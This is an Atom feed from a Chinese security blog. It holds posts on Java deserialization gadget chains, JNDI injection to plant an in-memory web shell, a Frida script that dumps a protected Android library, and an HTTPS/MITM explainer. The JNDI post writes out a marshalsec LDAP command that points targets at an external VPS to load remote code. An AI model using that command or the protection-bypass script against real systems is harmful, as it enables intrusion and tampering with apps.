<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>triplexlove的博客</title>
  
  <subtitle>现在开始还不迟</subtitle>
  <link href="https://tripexlove.github.io/atom.xml" rel="self"/>
  
  <link href="https://tripexlove.github.io/"/>
  <updated>2024-12-03T06:04:09.081Z</updated>
  <id>https://tripexlove.github.io/</id>
  
  <author>
    <name>triplexlove</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>peb学习</title>
    <link href="https://tripexlove.github.io/p/43338.html"/>
    <id>https://tripexlove.github.io/p/43338.html</id>
    <published>2024-12-03T03:47:35.000Z</published>
    <updated>2024-12-03T06:04:09.081Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="760d6ca16976541fbc551014373e9e0a17462534c728e3c965fb825682e4db03"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="免杀" scheme="https://tripexlove.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>AnnotationInvocationHandler的深度分析</title>
    <link href="https://tripexlove.github.io/p/37597.html"/>
    <id>https://tripexlove.github.io/p/37597.html</id>
    <published>2024-03-29T11:43:40.000Z</published>
    <updated>2024-03-29T11:52:16.464Z</updated>
    
    <content type="html"><![CDATA[<p>cc链于jdk原生反序列化中常用<code>AnnotationInvocationHandler</code>做最后的包装，其优点如下。</p><p>一、其readobject中有setvalue方法当cc1使用<code>TransformedMap</code>包裹时，setvalue后会调用TransformedMap中的checksetvalue方法进而调用valueTransformer.transform(value)达到命令执行。</p><p><img src="/imgs/AnnotationInvocationHandler%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/image.png" alt="image.png"></p><p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 1.png)</p><p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 2.png)</p><p>二、<code>AnnotationInvocationHandler</code>是一个代理类，其invoke方法中存在<code>equalsImpl</code>与<code>get</code>方法。使用<code>AnnotationInvocationHandler</code>包裹自身代理类后（如代理lazymap的map接口）则执行setvalue时必然会走到invoke方法中调用到get的危险方法如（lazymap.get）。7u21时会调用到equalsImpl。</p><p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 3.png)</p><p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 4.png)</p><p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 5.png)</p><h2 id="针对于动态代理在反序列化中的思考"><a href="#针对于动态代理在反序列化中的思考" class="headerlink" title="针对于动态代理在反序列化中的思考"></a>针对于动态代理在反序列化中的思考</h2><p>动态代理需要的东西：</p><p>一个要被代理的接口</p><p>一个被代理的实体类（其实现了某个接口）</p><p>一个实现了<code>InvocationHandler</code>代理类</p><p>最后使用Proxy.newProxyInstance实现动态代理</p><p>代理类代理的是接口，所以其构造方法一般是接受的是一个接口。</p><p>当追踪到反序列链条最终存在危险方法<code>a.b</code>时（如lazymap.get），要代理<code>a</code>的<code>b</code>方法时该方法必须是从一个接口如<code>c</code>实现而来，进而则可寻找满足如下条件的代理类。该代理类的构造方法接受<code>a</code>实现的接口<code>c</code>且invoke中调用了方法<code>b</code>。</p><p>如下图所示：</p><p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 6.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cc链于jdk原生反序列化中常用&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;做最后的包装，其优点如下。&lt;/p&gt;
&lt;p&gt;一、其readobject中有setvalue方法当cc1使用&lt;code&gt;TransformedMap&lt;/code&gt;包裹</summary>
      
    
    
    
    
    <category term="java安全" scheme="https://tripexlove.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入打内存马</title>
    <link href="https://tripexlove.github.io/p/23696.html"/>
    <id>https://tripexlove.github.io/p/23696.html</id>
    <published>2024-03-29T11:31:35.000Z</published>
    <updated>2024-03-29T11:41:56.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>以下两处类名需保持一致</p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193616538.png" alt="image-20240329193616538"></p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193903563.png" alt="image-20240329193903563"></p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%202.png" alt="image 2"></p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%203-1712456.png" alt="image 3"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>jmg生成class文件</p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%204.png" alt="image 4"></p><p>上传vps起一个http服务</p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%205.png" alt="image 5"></p><p>起ldap服务</p><pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;8.141.3.125:9999&#x2F;#qaxnb&quot; 7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%206.png" alt="image 6"></p><p>直接注入</p><p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%207.png" alt="image 7"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;方法一&quot;&gt;&lt;a href=&quot;#方法一&quot; class=&quot;headerlink&quot; title=&quot;方法一&quot;&gt;&lt;/a&gt;方法一&lt;/h2&gt;&lt;p&gt;以下两处类名需保持一致&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93</summary>
      
    
    
    
    
    <category term="java安全" scheme="https://tripexlove.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>某加密app分析</title>
    <link href="https://tripexlove.github.io/p/38418.html"/>
    <id>https://tripexlove.github.io/p/38418.html</id>
    <published>2023-08-22T23:55:50.000Z</published>
    <updated>2023-08-23T00:06:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="爱加密特性"><a href="#爱加密特性" class="headerlink" title="爱加密特性"></a>爱加密特性</h2><p>核心检测代码均在<code>libexecmain.so</code>中，爱加密会对该so进行加密处理，运行时会对其进行解密并释放到内存中，因此其基址会发生改变。</p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080015302.png" alt="image-20230823080015302"></p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080104586.png" alt="image-20230823080104586"></p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080152768.png" alt="image-20230823080152768"></p><h2 id="hook-dlopen"><a href="#hook-dlopen" class="headerlink" title="hook dlopen"></a>hook dlopen</h2><p>因为基址会变化，因此需要在so加载的时候hook。</p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080208425.png" alt="image-20230823080208425"></p><h2 id="dump-so"><a href="#dump-so" class="headerlink" title="dump_so"></a>dump_so</h2><p>获取到so的基址后从内存中读取so内容并写入<code>sdcard</code>目录下</p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080225913.png" alt="image-20230823080225913"></p><p>完整代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">dump_so</span><span class="token punctuation">(</span><span class="token parameter">so_name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> currentApplication <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"android.app.ActivityThread"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> dir <span class="token operator">=</span> currentApplication<span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFilesDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> libso <span class="token operator">=</span> Process<span class="token punctuation">.</span><span class="token function">getModuleByName</span><span class="token punctuation">(</span>so_name<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[name]:"</span><span class="token punctuation">,</span> libso<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[base]:"</span><span class="token punctuation">,</span> libso<span class="token punctuation">.</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[size]:"</span><span class="token punctuation">,</span> <span class="token function">ptr</span><span class="token punctuation">(</span>libso<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[path]:"</span><span class="token punctuation">,</span> libso<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> file_path <span class="token operator">=</span>   <span class="token string">"/sdcard/"</span> <span class="token operator">+</span> libso<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">+</span> libso<span class="token punctuation">.</span>base <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">+</span> <span class="token function">ptr</span><span class="token punctuation">(</span>libso<span class="token punctuation">.</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".so"</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> file_handle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>file_handle <span class="token operator">&amp;&amp;</span> file_handle <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Memory<span class="token punctuation">.</span><span class="token function">protect</span><span class="token punctuation">(</span><span class="token function">ptr</span><span class="token punctuation">(</span>libso<span class="token punctuation">.</span>base<span class="token punctuation">)</span><span class="token punctuation">,</span> libso<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token string">'rwx'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> libso_buffer <span class="token operator">=</span> <span class="token function">ptr</span><span class="token punctuation">(</span>libso<span class="token punctuation">.</span>base<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readByteArray</span><span class="token punctuation">(</span>libso<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>            file_handle<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>libso_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>            file_handle<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            file_handle<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[dump]:"</span><span class="token punctuation">,</span> file_path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">hook_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> soAddr <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">findBaseAddress</span><span class="token punctuation">(</span><span class="token string">"libexecmain.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"libexecmain.so addr: "</span><span class="token punctuation">,</span> soAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump_so</span><span class="token punctuation">(</span><span class="token string">"libexecmain.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> dlopen <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">findExportByName</span><span class="token punctuation">(</span><span class="token string">"libdl.so"</span><span class="token punctuation">,</span> <span class="token string">"dlopen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> android_dlopen_ext <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">findExportByName</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"android_dlopen_ext"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Interceptor<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>android_dlopen_ext<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">onEnter</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//console.log(args[0].readCString());</span>        <span class="token keyword">var</span> filename <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">readCString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"libexecmain.so"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>hook <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token function-variable function">onLeave</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">retval</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>hook <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">hook_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内容明显变大，但后续仍需修复</p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080252972.png" alt="image-20230823080252972"></p><h2 id="so修复"><a href="#so修复" class="headerlink" title="so修复"></a>so修复</h2><p>使用SoFixer即可完成对so的修复</p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080308374.png" alt="image-20230823080308374"></p><p><img src="/imgs/%E6%9F%90%E5%8A%A0%E5%AF%86app%E5%88%86%E6%9E%90/image-20230823080327182.png" alt="image-20230823080327182"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;爱加密特性&quot;&gt;&lt;a href=&quot;#爱加密特性&quot; class=&quot;headerlink&quot; title=&quot;爱加密特性&quot;&gt;&lt;/a&gt;爱加密特性&lt;/h2&gt;&lt;p&gt;核心检测代码均在&lt;code&gt;libexecmain.so&lt;/code&gt;中，爱加密会对该so进行加密处理，运行时会对其</summary>
      
    
    
    
    
    <category term="app逆向" scheme="https://tripexlove.github.io/tags/app%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>https如何预防中间人攻击</title>
    <link href="https://tripexlove.github.io/p/30100.html"/>
    <id>https://tripexlove.github.io/p/30100.html</id>
    <published>2022-09-01T08:37:43.000Z</published>
    <updated>2023-08-22T23:23:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是中间人攻击"><a href="#什么是中间人攻击" class="headerlink" title="什么是中间人攻击"></a>什么是中间人攻击</h2><ol><li>假设 Tom 想和 Jerry 交换一些秘密信息，然而 Tom 又不想跑到 Jerry 家里，于是 Tom 叫来了邮递员，给了邮递员一封信。信的内容是希望 Jerry 给 Tom 一个盒子（这个盒子有两把钥匙）和其中一把钥匙（另一把在 Jerry 手里）。</li><li>邮递员在拿到 Tom 给的信件以后，把 Tom 的信拆开看了一遍，了解到 Tom 希望 Jerry 给 Tom 一个有锁的盒子，又用另一个信封装了回去，并交给了 Jerry。</li><li>Jerry 在收到 Tom 的信（实际已经被邮递员拆阅过了）之后，给了邮递员一个有锁的盒子和其中一把钥匙。</li><li>邮递员想知道他们的通信内容，于是他把 Jerry 给 Tom 的盒子换成了他自己的盒子，并附上了自己盒子中的一把钥匙，并在之后将自己的盒子交给了 Tom。</li><li>Tom 在收到盒子之后，以为这个盒子是 Jerry 给他的，于是就把秘密的信件放进了盒子里，并把钥匙留下了，之后又交给了邮递员。</li><li>邮递员在拿到盒子之后，用自己的另一把钥匙打开盒子，看了里面的信件。之后将信件调换之后放进了 Jerry 给的盒子，交给了 Jerry。</li><li>Jerry 在拿到邮递员给他的盒子之后，并不知道这个盒子里的信件其实已经被邮递员调换过了，所以 Jerry 认为盒子里的信件是来自 Tom 且未被修改过的。之后 Jerry 把回信放进了盒子里，又交给了邮递员。</li><li>邮递员再次调换盒子里的信件，交给了 Tom。</li></ol><p>这就是一个典型中间人攻击的过程。在 HTTPS 中，Tom 就是客户端，Jerry 是服务端，而邮递员就是客户端和服务端之间的任何实体（包括代理服务器、路由器、反向代理服务器等等），两把钥匙分别是公钥和私钥。通信双方并不知道（且通常很难发觉）自己其实在和<em>中间人</em>通信而非直接和对方通信。在通信过程中，Tom 和 Jerry 并没有验证对方的身份，这就导致了邮递员可以任意查看、修改或者丢弃双方的通信内容。</p><h2 id="HTTPS-如何防范中间人攻击"><a href="#HTTPS-如何防范中间人攻击" class="headerlink" title="HTTPS 如何防范中间人攻击"></a>HTTPS 如何防范中间人攻击</h2><p>从上面的例子看起来，似乎任何在通信双方的实体都可以实施中间人攻击，那么 HTTPS 是如何防止中间人攻击的呢？要防止被中间人攻击，那么就要确保通信中的信息来自他声称的那个人，且没有被修改过。在现实中，有多种方式可以确定某个实体的身份，比如个人的签名 &#x2F; 私章、组织的公章、甚至古时的信物。大部分情况下，只需要在信件最后盖上签上自己的名字或者盖上组织的公章，那么接收者就可以确定这封信件就来自于他所声称的那个人 &#x2F; 组织。在二进制的世界中，可以使用数字签名来确保某段消息 &#x2F; 某份文件确实是由他所声称的那个实体所发出来的。</p><p>在之前的文章中，我们介绍过非对称加密，其中公钥是公开的，而私钥只有拥有者知道。用私钥对某个文件 &#x2F; 某段消息的散列值进行签名就像一个人亲手在信件最后签上了自己的名字一样，证明这份文件 &#x2F; 这段消息确实来自私钥的拥有者（<em>因为公钥是公开的，私钥只有拥有者知道，所以如果能用其公开的公钥解开数字签名，那就证明这条消息确实来自于他私钥的拥有者</em>），这就可以确保消息是来自他所声称的那个实体。这样，在通信中，双方每次在写完消息之后，计算消息的散列值，并用自己的私钥加密生成数字签名，附在信件后面，接收者在收到消息和数字签名之后，先计算散列值，再使用对方的公钥解密数字签名中的散列值，进行对比，如果一致，就可以确保该消息确实是来自于对方，并且没有被篡改过。</p><p>不过有个问题，如果<em>中间人在会话建立阶段把双方交换的真实公钥替换成自己的公钥</em>了，那么中间人还是可以篡改消息的内容而双方并不知情。为了解决这个问题，需要找一个通信双方都信任的第三方来为双方确认身份。这就像大家都相信公证处，公证处拿着自己的公章为每一封信件都盖上了自己的章，证明这封信确实是由本人发出的，这样就算中间人可以替换掉通信双方消息的签名，也无法替换掉公证处的公章。这个公章，在二进制的世界里，就是<em><strong>数字证书</strong></em>，公证处就是 <em><strong>CA（数字证书认证机构）</strong></em>。</p><p>数字证书就是申请人将一些必要信息（包括公钥、姓名、电子邮件、有效期）等提供给 CA，CA 在通过各种手段确认申请人确实是他所声称的人之后，用自己的私钥对申请人所提供信息计算散列值进行加密，形成数字签名，附在证书最后，再将数字证书颁发给申请人，申请人就可以使用 CA 的证书向别人证明他自己的身份了。对方收到数字证书之后，只需要用 CA 的公钥解密证书最后的签名得到加密之前的散列值，再计算数字证书中信息的散列值，将两者进行对比，只要散列值一致，就证明这张数字证书是有效且未被篡改过的。</p><p>通信过程的安全性<em><strong>自下而上</strong></em>就是这样保证的：</p><ol><li>双方通信内容的安全性是靠公钥加密、私钥解密来保证的，这一安全性由非对称加密的特性，即由公钥加密的信息只能使用对应的私钥才能解开来保证。由于私钥不会传递，只有拥有者知道，所以<em>安全性就由<strong>公钥</strong>的正确性来保证。</em></li><li>公钥由对方在通信初始所提供，但是这时很容易被中间人替换掉，为了保证公钥的正确性，所以在发送公钥的时候也会提供对应的数字证书，用于验证这个公钥是对方的而不是中间人的。那么<em>安全性就是由<strong>数字证书</strong>的正确性来保证了。</em></li><li>数字证书是由上级 CA 签发给个人 &#x2F; 组织的，上级 CA 用自己的私钥给个人证书进行签名，保证证书中的公钥不被篡改，而接受者需要用上级 CA 证书中的公钥来解密个人数字证书中的数字签名来验证证书中的公钥是否是正确的。那么<em>安全性就是由<strong>上级 CA 证书</strong>的正确性保证的了。</em></li><li>但是，上级 CA 证书也是由其上级 CA 签发的，这种信任关系一直到根证书。根证书没有上级 CA 为其签名，而是自签名的，也就是说，它自身为自身签名，保证正确性。所以根证书就是这个信任链最重要的部分。如果根证书泄露的话，其签名的所有证书及使用其签名的证书所签名的证书的安全性将不复存在。现在，<em>安全性就是靠系统<strong>根证书</strong>的私钥不被泄露或者其公钥不被篡改来保证的了。</em></li><li>根证书不应该通过网络分发，因为通过网络分发的话，可能会被中间人攻击。一般根证书都通过操作系统或者浏览器分发，在操作系统中会内置很多根证书，但是最初的操作系统也不能通过网络分发，因为中间人可以修改操作系统中的根证书。所以要保证安全只能靠最原始的方法，当面交流。硬件厂商会和证书签发机构合作，在电脑、手机等设备出厂的时候在其操作系统中<strong>内置</strong>签发机构的根证书，再将这些设备分发出去，这样，这些设备的用户就可以安全地进行信息交换了。所以，<em>安全性就依赖于这些设备在分发到消费者手中之前不会被恶意修改来保证了。</em></li></ol><p>至此，整个信任链就建立起来了，只需要有一台设备上安装了可以信任的根证书，就可以用来分发更多安全的操作系统了。之后的所有信任链都是安全的了。</p><hr><h2 id="SSLTrip-及-HSTS"><a href="#SSLTrip-及-HSTS" class="headerlink" title="SSLTrip 及 HSTS"></a>SSLTrip 及 HSTS</h2><p>HTTP 协议最初的时候是明文的，因为安全问题所以现在很多网站都在逐渐过渡到 HTTPS，然而对于大部分使用者来说，他们并不知道 HTTP 和 HTTPS 之间的区别，在浏览器输入地址的时候都是直接输入 <code>www.example.com</code> 而非 <code>https://www.example.com</code>，在大部分情况下，如果一个网站启用了 HTTPS，服务器会将这个请求使用 <code>301</code> 或者 <code>302</code> 状态码以及一个 <code>Location</code> 头部将请求从 80 端口重定向至使用 HTTPS 的 443 端口。但是，如果中间人劫持了使用者的网络请求，那么中间人可以阻止客户端与服务器建立 HTTPS 连接，而是一直使用不安全的 HTTP 连接，而中间人则和服务器建立正常的 HTTPS 连接，让客户端以为自己正在和真实服务器通信。这种攻击手法称作 SSLTrip。</p><p>为了解决这个问题，IETF（互联网工程任务小组）引入了一个策略，叫做 <strong>HSTS</strong> (HTTP Strict Transport Security, HTTP 严格传输安全)。HSTS 的作用是强制客户端与服务端建立安全的 HTTPS 连接，而非不安全的 HTTP 连接。如果一个站点启用了 HSTS 策略，那么客户端在第一次与该站点建立连接之后，在未来的一段时间内（由一个 HTTP 头部控制，这个头部为：Strict-Transport-Security），客户端与该站点的所有连接都会直接使用 HTTPS，<em>即使客户端访问的是 HTTP，也会直接在客户端重定向到 HTTPS 连接。</em></p><p>假设 <code>https://example.com</code> 的响应头部含有 <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>，这意味着：</p><ol><li>在未来的 1 年时间里（即 31536000 秒中），只要浏览器向 <code>example.com</code> 或者其子域名发送请求，必须采用 HTTPS 来发起连接。即使用户在地址栏里写的是 <code>http://example.com</code>，那也直接重写为 <code>https://example.com</code> 并直接发起 HTTPS 连接。</li><li>在接下去的一年中，如果服务器提供的 HTTPS 证书无效（不论是域名对不上还是自签名还是不在有效期内），用户都无法访问该站点。</li></ol><p>如果站点没有启用 HSTS，用户可以忽略证书无效的警告，继续建立连接，而如果站点启用了 HSTS，那么用户即使想冒风险，浏览器也不会继续访问。</p><p>HSTS 可以很大程度上防止 SSLTrip 攻击，不过这样还是有个问题，那就是要启用 HSTS，浏览器至少要和服务器建立一次 HTTPS 连接，如果中间人一直阻止浏览器与服务器建立 HTTPS 连接，那么 HSTS 就失效了。解决这个问题有个办法，那就是将 HSTS 站点列表内置到浏览器中，这样只要浏览器<strong>离线</strong>判断该站点启用了 HSTS，就会跳过原先的 HTTP 重定向，直接发起 HTTPS 请求。</p><hr><p>转载自：<a href="https://segmentfault.com/a/1190000013075736">https://segmentfault.com/a/1190000013075736</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是中间人攻击&quot;&gt;&lt;a href=&quot;#什么是中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;什么是中间人攻击&quot;&gt;&lt;/a&gt;什么是中间人攻击&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;假设 Tom 想和 Jerry 交换一些秘密信息，然而 Tom 又不想跑到 Je</summary>
      
    
    
    
    <category term="Something" scheme="https://tripexlove.github.io/categories/Something/"/>
    
    
    <category term="blog" scheme="https://tripexlove.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>windows本地认证与网络认证</title>
    <link href="https://tripexlove.github.io/p/47612.html"/>
    <id>https://tripexlove.github.io/p/47612.html</id>
    <published>2022-08-09T07:32:06.000Z</published>
    <updated>2023-08-22T23:23:06.000Z</updated>
    
